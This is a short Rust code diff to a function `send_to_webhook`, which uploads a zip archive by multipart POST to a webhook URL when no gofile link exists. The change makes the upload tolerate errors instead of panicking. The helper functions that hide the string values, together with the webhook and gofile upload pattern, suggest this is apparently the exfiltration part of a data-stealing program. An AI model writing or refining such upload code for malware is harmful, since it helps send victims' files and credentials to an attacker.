@@ -121,13 +121,14 @@ pub async fn send_to_webhook(
     }
 
     if gofile_link.is_none() {
-        let zip_part = reqwest::multipart::Part::bytes(zip_data)
+        if let Ok(zip_part) = reqwest::multipart::Part::bytes(zip_data)
             .file_name(zip_name)
             .mime_str(&s_sender_application_zip())
-            .unwrap();
-        let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
-        let r = client.post(webhook_url).multipart(zip_form).send().await;
-        statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
+        {
+            let zip_form = reqwest::multipart::Form::new().part(s_sender_file(), zip_part);
+            let r = client.post(webhook_url).multipart(zip_form).send().await;
+            statuses.push(format!("zip_fallback={}", r.map(|r| r.status()).unwrap_or_default()));
+        }
     }
 
     statuses
